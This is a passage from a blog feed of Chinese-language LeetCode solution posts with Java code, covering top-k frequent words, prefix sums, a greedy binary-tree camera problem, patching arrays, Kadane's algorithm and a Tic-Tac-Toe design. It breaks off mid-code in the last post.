        <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Given a non-empty list of words, return the k most frequent elements.</p><p>Your answer should be sorted by frequency from highest to lowest. If two words have the same frequency, then the word with the lower alphabetical order comes first.</p><p><strong>Example 1:</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Input: [&quot;i&quot;, &quot;love&quot;, &quot;leetcode&quot;, &quot;i&quot;, &quot;love&quot;, &quot;coding&quot;], k = 2</span><br><span class="line">Output: [&quot;i&quot;, &quot;love&quot;]</span><br><span class="line">Explanation: &quot;i&quot; and &quot;love&quot; are the two most frequent words.</span><br><span class="line">Note that &quot;i&quot; comes before &quot;love&quot; due to a lower alphabetical order.</span><br></pre></td></tr></table></figure></p><p><strong>Example 2:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Input: [&quot;the&quot;, &quot;day&quot;, &quot;is&quot;, &quot;sunny&quot;, &quot;the&quot;, &quot;the&quot;, &quot;the&quot;, &quot;sunny&quot;, &quot;is&quot;, &quot;is&quot;], k = 4</span><br><span class="line">Output: [&quot;the&quot;, &quot;is&quot;, &quot;sunny&quot;, &quot;day&quot;]</span><br><span class="line">Explanation: &quot;the&quot;, &quot;is&quot;, &quot;sunny&quot; and &quot;day&quot; are the four most frequent words,</span><br><span class="line">    with the number of occurrence being 4, 3, 2 and 1 respectively.</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h2><p>经典的问题，寻找topk频率的单词，如果遇到tie则比较字典序，字典序小的在前面，遍历一边统计顺序，利用heap或者说priority queue保存即可，不过记录这道题的目的是用下java 对函数编程的支持，因为以前都是新建一个class做的，比较笨拙</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> List&lt;String&gt; <span class="title">topKFrequent</span><span class="params">(String[] words, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">    List&lt;String&gt; res = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">    Map&lt;String, Integer&gt; count = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span>(String word: words)&#123;</span><br><span class="line">        count.put(word, count.getOrDefault(word,<span class="number">0</span>) + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 这边可以向pq传递一个比较参数，为lambda表达式</span></span><br><span class="line">    <span class="comment">// 有一个比较trick的是通过三目运算来解决tie的问题，相当于实现了一个if else语句</span></span><br><span class="line">    PriorityQueue&lt;String&gt; pq = <span class="keyword">new</span> PriorityQueue&lt;&gt;((a,b) -&gt; count.get(a).equals(count.get(b)) ? b.compareTo(a) : count.get(a) - count.get(b));</span><br><span class="line">    <span class="keyword">for</span>(String word: count.keySet())&#123;</span><br><span class="line">        pq.add(word);</span><br><span class="line">        <span class="keyword">if</span>(pq.size() &gt; k)</span><br><span class="line">            pq.poll();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(!pq.isEmpty())&#123;</span><br><span class="line">        res.add(pq.poll());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//注意此时的res是反的，题目要求返回从高频到低频的单词</span></span><br><span class="line">    Collections.reverse(res);</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>topk这种高频入门必刷题，需要熟练掌握，用一些函数式编程的小trick可以让我们做题速度更快，代码更加优雅</p>]]></content>
      
      
      
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Leetcode930 Binary Subarry With Sum</title>
      <link href="/2019/11/13/Leetcode930-Binary-Subarry-With-Sum/"/>
      <url>/2019/11/13/Leetcode930-Binary-Subarry-With-Sum/</url>
      
        <content type="html"><![CDATA[<h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>In an array A of 0s and 1s, how many non-empty subarrays have sum S?</p><p><strong>Example 1:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Input: A = [1,0,1,0,1], S = 2</span><br><span class="line">Output: 4</span><br><span class="line">Explanation: </span><br><span class="line">The 4 subarrays are bolded below:</span><br><span class="line">[1,0,1,0,1]</span><br><span class="line">[1,0,1,0,1]</span><br><span class="line">[1,0,1,0,1]</span><br><span class="line">[1,0,1,0,1]</span><br></pre></td></tr></table></figure><p><strong>Note:</strong></p><ul><li>A.length &lt;= 30000</li><li>0 &lt;= S &lt;= A.length</li><li>A[i] is either 0 or 1</li></ul><a id="more"></a><h2 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h2><p>题目是在一个由0、1组成的序列中，找到和为S的subarray的个数。</p><p>所有subarray的题目都可以考虑用prefix sum进行优化，即sum(i ,j) = prefix(j) - prefix(i)对于本题而言，可以利用HashMap存储prefix为特定sum的序列个数，每次有X新的元素加入的时候，更新即可，代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">numSubarraysWithSum</span><span class="params">(<span class="keyword">int</span>[] A, <span class="keyword">int</span> S)</span> </span>&#123;</span><br><span class="line">    Map&lt;Integer, Integer&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    map.put(<span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; A.length; i++)&#123;</span><br><span class="line">        sum += A[i];</span><br><span class="line">        <span class="keyword">int</span> target = sum - S;</span><br><span class="line">        <span class="comment">//检查prefix和为target的序列有多少个</span></span><br><span class="line">        res += map.getOrDefault(target, <span class="number">0</span>);</span><br><span class="line">        map.put(sum, map.getOrDefault(sum ,<span class="number">0</span>) + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Leetcode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Array </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Leetcode968 Binary Tree Cameras</title>
      <link href="/2019/11/13/Leetcode968-Binary-Tree-Cameras/"/>
      <url>/2019/11/13/Leetcode968-Binary-Tree-Cameras/</url>
      
        <content type="html"><![CDATA[<h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>Given a binary tree, we install cameras on the nodes of the tree. </p><p>Each camera at a node can monitor its parent, itself, and its immediate children.</p><p>Calculate the minimum number of cameras needed to monitor all nodes of the tree.</p><a id="more"></a><p>Eample 1:</p><p><img alt src="https://assets.leetcode.com/uploads/2018/12/29/bst_cameras_01.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: [0,0,null,0,0]</span><br><span class="line">Output: 1</span><br><span class="line">Explanation: One camera is enough to monitor all nodes if placed as shown.</span><br></pre></td></tr></table></figure><p><img alt src="https://assets.leetcode.com/uploads/2018/12/29/bst_cameras_02.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: [0,0,null,0,null,0,null,null,0]</span><br><span class="line">Output: 2</span><br><span class="line">Explanation: At least two cameras are needed to monitor all nodes of the tree. The above image shows one of the valid configurations of camera placement.</span><br></pre></td></tr></table></figure><h2 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h2><p>这道题大概是说每个节点放一个相机，可以monitor父节点，自己以及直接的后继节点，要求求出最小放置的相机数量，使得整个二叉树都能被monitor到。</p><p>我们可以列举出每个被monitor节点有四种可能性，左子节点有相机，右子节点有相机，自己有相机或者父节点有相机。然后buttom up， 对于Leaf节点，如果在leaf放一个相机，自己和父节点可以cover，如果父节点放一个相机，父节点，两个子节点和父节点的父节点（parent’s parent）都能cover，也就是说对于所有leaf节点而言，在其父节点放一个相机，永远优于在leaf节点放相机。</p><p>有了这样一个推理，则可以利用Greedy的思路解决这个问题<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">minCameraCover</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preOrder(root) == <span class="number">0</span> ? <span class="number">1</span> + res : res; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">preOrder</span><span class="params">(TreeNode root)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root == <span class="keyword">null</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> left = preOrder(root.left);</span><br><span class="line">    <span class="keyword">int</span> right = preOrder(root.right);</span><br><span class="line">    <span class="comment">//两个子节点有一个没有被cover，则在该节点放一个相机</span></span><br><span class="line">    <span class="keyword">if</span>(left == <span class="number">0</span> || right == <span class="number">0</span>)&#123;</span><br><span class="line">        ++res;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//如果两个节点都被cover了且有一个上面有相机，则该节点被cover并且无需放相机</span></span><br><span class="line">    <span class="comment">// 如果两个节点都被cover但都没有相机，则该节点没有被cover，需要其父节点放一个相机</span></span><br><span class="line">    <span class="keyword">return</span> (left == <span class="number">1</span> || right == <span class="number">1</span>) ? <span class="number">2</span> : <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>每个节点用0，1，2表示三种不同的状态:</p><ul><li>0表示这个节点没有被cover</li><li>1表示这个节点上有一个相机</li><li>2表示这个节点被cover了但没有相机</li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>一道很不错的Greedy算法题，评论区有一个很好的类比可以帮助我们理解这个算法背后的含义:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">2---孤儿，不需要父母照顾</span><br><span class="line">1---爸爸，可以照顾儿子和父母</span><br><span class="line">0---啃老族：爸爸带带我。</span><br><span class="line"></span><br><span class="line">两个后继都是孤儿时（2），不需要干任何事，可以化身啃老族（0）。</span><br><span class="line">当你的后继里面有啃老族（0），你就必须成为爸爸（1）-----camera+1</span><br><span class="line">当你的后继里面有爸爸（1）时，你又变成里不需要任何照顾的孤儿（2）</span><br></pre></td></tr></table></figure><p>核心还是在于发现在父节点放相机永远优于在leaf节点放相机</p>]]></content>
      
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> Greedy </tag>
            
            <tag> DFS </tag>
            
            <tag> Tree </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Leetcode330 Patching Array</title>
      <link href="/2019/11/12/Leetcode330-Patching-Array/"/>
      <url>/2019/11/12/Leetcode330-Patching-Array/</url>
      
        <content type="html"><![CDATA[<h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>Given a sorted positive integer array nums and an integer n, add/patch elements to the array such that any number in range [1, n] inclusive can be formed by the sum of some elements in the array. Return the minimum number of patches required.<br><a id="more"></a><br>Example 1:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Input: nums = [1,3], n = 6</span><br><span class="line">Output: 1 </span><br><span class="line">Explanation:</span><br><span class="line">Combinations of nums are [1], [3], [1,3], which form possible sums of: 1, 3, 4.</span><br><span class="line">Now if we add/patch 2 to nums, the combinations are: [1], [2], [3], [1,3], [2,3], [1,2,3].</span><br><span class="line">Possible sums are 1, 2, 3, 4, 5, 6, which now covers the range [1, 6].</span><br><span class="line">So we only need 1 patch.</span><br></pre></td></tr></table></figure></p><p>Example 2:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: nums = [1,5,10], n = 20</span><br><span class="line">Output: 2</span><br><span class="line">Explanation: The two patches can be [2, 4].</span><br></pre></td></tr></table></figure></p><p>Example 3:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: nums = [1,2,2], n = 5</span><br><span class="line">Output: 0</span><br></pre></td></tr></table></figure></p><h2 id="题目解析"><a href="#题目解析" class="headerlink" title="题目解析"></a>题目解析</h2><p>这道题目意思很简单，一个排序好了的数列，选择其中任意的几个相加，要求结果覆盖1 - n，如果不能覆盖，则可以添加patch，求最小patch数。</p><p>首先说明下，这道题我并没有做出来，这是我见过的最优雅的贪心算法之一，可以用非常简洁的代码完成任务。</p><p>首先，假设有一个数miss了，那说明[1, miss - 1]已经被覆盖了，而为了覆盖miss，找一个数x，这个x必然小于等于miss，因为大于的话miss依旧不会被覆盖，举几个数就能理解了，这个x就是题目中的patch，也就是补丁，添加了x后覆盖范围就变成了[1, miss + x - 1]了，我们为了让patch数最小，就得每次在范围拓展的时候将上限，也就是(miss + x - 1)尽可能的大，之前在对于x的讨论中，可以发现要x的可能取值范围在[1, miss]之间，取最大值即可，也就是说每次添加的patch正好为miss值，有了这样一个概念，题目也就迎刃而解了。</p><p>算法描述:</p><ul><li>Initialize the range [1, miss) = [1, 1) = empty<br>While n is not covered yet</li><li>if the current element nums[i] is less than or equal to miss<ul><li>extends the range to [1, miss + nums[i])</li><li>increase i by 1</li></ul></li><li>otherwise<ul><li>patch the array with miss, extends the range to [1, miss + miss)</li><li>increase the number of patches</li></ul></li><li>Return the number of patches</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">minPatches</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 这边用long 防止溢出</span></span><br><span class="line">    <span class="keyword">long</span> miss = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> patches = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(miss &lt;= n)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i &lt; nums.length &amp;&amp; nums[i] &lt;= miss)&#123;</span><br><span class="line">            miss += nums[i++];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            miss *= <span class="number">2</span>;</span><br><span class="line">            ++patches;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> patches;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这是我见过的最优雅的利用Greedy思想解决的问题，一开始我还想了很多，甚至考虑到哥德巴赫猜想什么的（感叹下自己的脑洞），但解决起来，其实只是一个基本的观察和推演思考，说实话这个miss与之前的关系我还真没有想到，抽象思维能力感觉与高中相比退化了不少，希望能通过这些题目予以训练和改善吧。</p><p>总而言之，这是一道非常好的题目，如果有人能在面试的时候答出来，建议直接录用。</p>]]></content>
      
      
      <categories>
          
          <category> Leetcode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Algorithms </tag>
            
            <tag> Greedy </tag>
            
            <tag> Leetcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kadane‘s Algorithm</title>
      <link href="/2019/11/12/Kadane-Algorithm/"/>
      <url>/2019/11/12/Kadane-Algorithm/</url>
      
        <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>计算机历史上有一个非常经典的问题叫做Maximum-Subarray-Problem， 求数组的最大子序列，要求该子序列和为最大值，子序列应当连续。</p><p>比如 [−2, 1, −3, 4, −1, 2, 1, −5, 4]， 最大应该子序列为 [4, −1, 2, 1]。</p><p>暴力的解法是算出所有的子序列，然后求和，该方法的时间复杂度为O(n^2).</p><h2 id="Kadane’s-Algorithm"><a href="#Kadane’s-Algorithm" class="headerlink" title="Kadane’s Algorithm"></a>Kadane’s Algorithm</h2><p>Kadane’s Algorithm是求解该类问题的一个通法，原理是利用Dynamic Programming保存所有以i结尾的子序列的最大长度，dp公式为:</p><script type="math/tex; mode=display">dp[i] = Math.max(dp[i - 1], 0) + nums[i]</script><a id="more"></a><p>如果以i - 1为结尾的子序列最大值为负，那么不管怎么样，dp[i]就应该从头开始计数，因为前面的子序列已经不再有影响了(dp[i - 1] + nums[i]必然小于nums[i])</p><p>Leetcode里有两道经典的题目，用到了这个算法，分别为Leetcode53和Leetcode1186，Leetcode 53是这一算法的直接运用，代码如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxSubArray</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span>[] dp = <span class="keyword">new</span> <span class="keyword">int</span>[nums.length];</span><br><span class="line">    dp[<span class="number">0</span>] = nums[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">int</span> res = dp[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; nums.length; i++)&#123;</span><br><span class="line">        dp[i] = Math.max(dp[i - <span class="number">1</span>], <span class="number">0</span>) + nums[i];</span><br><span class="line">        res = Math.max(dp[i], res);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>Leetcode1186是一个变式，基本思路不变，不过我们可以选择是否删除删除一个元素，显然，如果遇到负数，我们可以考虑将其删除，然后计算两头，对于第i个数字，如果它是负数，则计算以i - 1为结尾的最大子序列和以i + 1为开头的最大子序列，我们分别用dp1，dp2存储这两种状态，原理依旧是Kadane’s Algorithm</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maximumSum</span><span class="params">(<span class="keyword">int</span>[] arr)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span>[] dp1 = <span class="keyword">new</span> <span class="keyword">int</span>[arr.length];</span><br><span class="line">    <span class="keyword">int</span>[] dp2 = <span class="keyword">new</span> <span class="keyword">int</span>[arr.length];</span><br><span class="line">    dp1[<span class="number">0</span>] = arr[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">int</span> res = arr[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; arr.length; i++)&#123;</span><br><span class="line">        dp1[i] = Math.max(dp1[i - <span class="number">1</span>], <span class="number">0</span>) + arr[i];</span><br><span class="line">        res = Math.max(res,dp1[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    dp2[arr.length - <span class="number">1</span>] = arr[arr.length - <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = arr.length - <span class="number">2</span>; i &gt; -<span class="number">1</span>; --i)&#123;</span><br><span class="line">        dp2[i] = Math.max(dp2[i + <span class="number">1</span>], <span class="number">0</span>) + arr[i];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; arr.length - <span class="number">1</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(arr[i] &lt; <span class="number">0</span>)</span><br><span class="line">            res = Math.max(dp1[i - <span class="number">1</span>] + dp2[i + <span class="number">1</span>], res);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>为什么突然写这个？ 因为做到1186卡了挺久，当然也有读错题的缘故，不过归根结底还是因为没有对这个方法进行总结，像这种以人名命名的算法还是应当总结下的 :P</p>]]></content>
      
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> Algorithms </tag>
            
            <tag> Dynamic Programming </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LeetCode348 Design Tic Tac Toe</title>
      <link href="/2019/11/04/Leetcode348-Design-Tic-Tac-Toe/"/>
      <url>/2019/11/04/Leetcode348-Design-Tic-Tac-Toe/</url>
      
        <content type="html"><![CDATA[<h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>Design a Tic-tac-toe game that is played between two players on a n x n grid.</p><p>You may assume the following rules:</p><ul><li>A move is guaranteed to be valid and is placed on an empty block.</li><li>Once a winning condition is reached, no more moves is allowed.</li><li>A player who succeeds in placing n of their marks in a horizontal, vertical, or diagonal row wins the game.<a id="more"></a>Example:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">Given n = 3, assume that player 1 is &quot;X&quot; and player 2 is &quot;O&quot; in the board.</span><br><span class="line"></span><br><span class="line">TicTacToe toe = new TicTacToe(3);</span><br><span class="line"></span><br><span class="line">toe.move(0, 0, 1); -&gt; Returns 0 (no one wins)</span><br><span class="line">|X| | |</span><br><span class="line">| | | |    // Player 1 makes a move at (0, 0).</span><br><span class="line">| | | |</span><br><span class="line"></span><br><span class="line">toe.move(0, 2, 2); -&gt; Returns 0 (no one wins)</span><br><span class="line">|X| |O|</span><br><span class="line">| | | |    // Player 2 makes a move at (0, 2).</span><br><span class="line">| | | |</span><br><span class="line"></span><br><span class="line">toe.move(2, 2, 1); -&gt; Returns 0 (no one wins)</span><br><span class="line">|X| |O|</span><br><span class="line">| | | |    // Player 1 makes a move at (2, 2).</span><br><span class="line">| | |X|</span><br><span class="line"></span><br><span class="line">toe.move(1, 1, 2); -&gt; Returns 0 (no one wins)</span><br><span class="line">|X| |O|</span><br><span class="line">| |O| |    // Player 2 makes a move at (1, 1).</span><br><span class="line">| | |X|</span><br><span class="line"></span><br><span class="line">toe.move(2, 0, 1); -&gt; Returns 0 (no one wins)</span><br><span class="line">|X| |O|</span><br><span class="line">| |O| |    // Player 1 makes a move at (2, 0).</span><br><span class="line">|X| |X|</span><br><span class="line"></span><br><span class="line">toe.move(1, 0, 2); -&gt; Returns 0 (no one wins)</span><br><span class="line">|X| |O|</span><br><span class="line">|O|O| |    // Player 2 makes a move at (1, 0).</span><br><span class="line">|X| |X|</span><br><span class="line"></span><br><span class="line">toe.move(2, 1, 1); -&gt; Returns 1 (player 1 wins)</span><br><span class="line">|X| |O|</span><br><span class="line">|O|O| |    // Player 1 makes a move at (2, 1).</span><br><span class="line">|X|X|X|</span><br></pre></td></tr></table></figure></li></ul><p>Follow up:<br>Could you do better than O(n2) per move() operation?</p><h2 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h2><p>题目要求设计个井字棋游戏，要求能够下子并且下了后能够判断输赢，一个很简单的方法就是存一个n * n的数组，用来保存棋谱，不过follow up要求用比O(n2)更好的方式解决move。</p><p>其实我们只要记录行、列、以及对角线上的子的个数就行，因为只有两种情况，所以可以分别设置为+1, -1每次检查下绝对值之和是否为n即可，时间复杂度和空间复杂度都是O(n)。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TicTacToe</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span>[] rows;</span><br><span class="line">    <span class="keyword">int</span>[] cols;</span><br><span class="line">    <span class="keyword">int</span> dig;</span><br><span class="line">    <span class="keyword">int</span> bdig;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="comment">/** Initialize your data structure here. */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TicTacToe</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        rows = <span class="keyword">new</span> <span class="keyword">int</span>[n];</span><br><span class="line">        cols = <span class="keyword">new</span> <span class="keyword">int</span>[n];</span><br><span class="line">        dig = <span class="number">0</span>;</span><br><span class="line">        